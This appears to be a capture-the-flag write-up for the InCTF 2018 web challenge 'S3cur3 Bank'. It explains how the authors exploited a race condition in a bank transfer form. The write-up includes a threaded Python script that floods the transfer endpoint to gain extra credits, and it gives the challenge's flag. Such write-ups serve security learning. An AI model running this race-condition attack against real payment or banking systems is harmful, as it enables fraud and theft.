### InCTF 2018

##### Challenge: S3cur3 Bank

##### Category: Web

##### Points: 179

##### Solves: 44/306

##### Description: It is notoriously called the most secure bank service ever. It allows us to transfer your money between 2 accounts. Can you hack the service to buy a flag???

In this challenge we had a website of a bank that after sign up and sign in we see two bank accounts with a total of 2000 credits and we could do transfer between them. In the same site, we had a button for buying a flag but it cost 5000 credits.

After analyzing the website (HTML code, headers, parameters, etc.) we did not see anything that seemed vulnerable, so Race Condition came to our mind.

We created a simple script in python with a couple of threads to make multiple transactions in a short period of time.

```python
import time
import requests
import threading

headers = {'Content-Type': 'application/x-www-form-urlencoded'}
for i in range(0xfffff):
    time.sleep(0.1)

    def AtoB(cantidad):
        r = requests.post( 'http://18.188.42.158/bank.php?id=b188193ac995dc526ad52fb835b3357c', 
                           headers=headers, 
                           data={'transfer':cantidad,'account':'Transfer to B'})

    threading.Thread(target=AtoB, args=(200, )).start()
    threading.Thread(target=AtoB, args=(200, )).start()

```
After some executions we got more than 5000 credits and could buy the flag :)

![securebank1](https://user-images.githubusercontent.com/38633962/46703201-66c7e500-cc26-11e8-991c-bd20d5756780.png)

```
inctf{y0u_r4c3_v3ry_w3ll}
```
